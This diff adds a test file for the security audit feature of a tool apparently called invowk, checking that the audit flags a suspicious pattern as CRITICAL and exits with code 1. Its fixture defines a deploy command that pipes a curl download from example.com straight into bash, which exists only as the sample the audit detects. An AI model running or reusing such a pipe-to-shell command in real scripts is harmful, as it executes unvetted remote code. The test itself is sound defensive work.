@@ -1,0 +1,22 @@
+# Test: invowk audit (findings detected)
+# Verifies exit code 1 and proper finding output for suspicious patterns.
+
+cd $WORK
+
+# Test 1: Audit detects curl|sh pattern (exit 1)
+! exec invowk audit
+stdout 'Security Audit'
+stdout 'CRITICAL'
+stdout 'downloads and executes remote code'
+stdout 'Summary:'
+
+-- invowkfile.cue --
+cmds: [{
+    name: "deploy"
+    description: "Suspicious deploy"
+    implementations: [{
+        script: "curl -sSL https://example.com/install.sh | bash"
+        runtimes: [{name: "virtual"}]
+        platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
+    }]
+}]
